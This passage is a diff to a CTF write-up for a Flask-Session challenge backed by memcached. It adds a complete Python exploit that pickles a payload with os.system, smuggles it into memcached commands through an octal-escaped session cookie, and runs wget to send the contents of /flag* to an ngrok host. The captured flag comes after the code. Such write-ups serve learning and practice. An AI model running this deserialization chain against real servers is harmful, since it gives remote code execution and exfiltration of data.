@@ -33,7 +33,7 @@ After reading the sessions.py from `https://github.com/pallets-eco/flask-session
 I found that it use the `cPickle` which is vulnerable to deserialization attack, After a bit of googling about memcached and cPickle i came accross this as POC of the exploit
 `https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/`
 
-
+I tried to wget my webhook and it worked !, GOT RCE
 <br></br>
 ```py
 from requests import *
@@ -71,4 +71,50 @@ print(c)
 url="http://83.136.255.150:51682/"
 r=get(url,cookies={"session":c})
 # print(r.text)
+```
+<br></br>
+<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/HTB_cyber_apocalypse/WEB/images/7.PNG">
+<br></br>
+```py
+from requests import *
+import re
+import pickle
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('wget https://1a46-80-10-22-106.ngrok-free.app/?c=$(cat /flag*)')
+        return os.system, (cmd,)
+
+def generate_exploit():
+    payload = pickle.dumps(RCE(), 0)
+    payload_size = len(payload)
+    cookie = b'137\r\nset session:10 0 2592000 '
+    cookie += str.encode(str(payload_size))
+    cookie += str.encode('\r\n')
+    cookie += payload
+    cookie += str.encode('\r\n')
+    cookie += str.encode('get session:10')
+
+    pack = ''
+    for x in list(cookie):
+        if x > 64:
+            pack += oct(x).replace("0o","\\")
+        elif x < 8:
+            pack += oct(x).replace("0o","\\00")
+        else:
+            pack += oct(x).replace("0o","\\0")
+
+    return f"\"{pack}\""
+c=generate_exploit()
+print(c)
+url="http://83.136.255.150:51682/"
+r=get(url,cookies={"session":c})
+# print(r.text)
+```
+<br></br>
+<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/HTB_cyber_apocalypse/WEB/images/8.PNG">
+<br></br>
+```
+HTB{y0u_th0ught_th15_wou1d_b3_s1mpl3?}
 ```
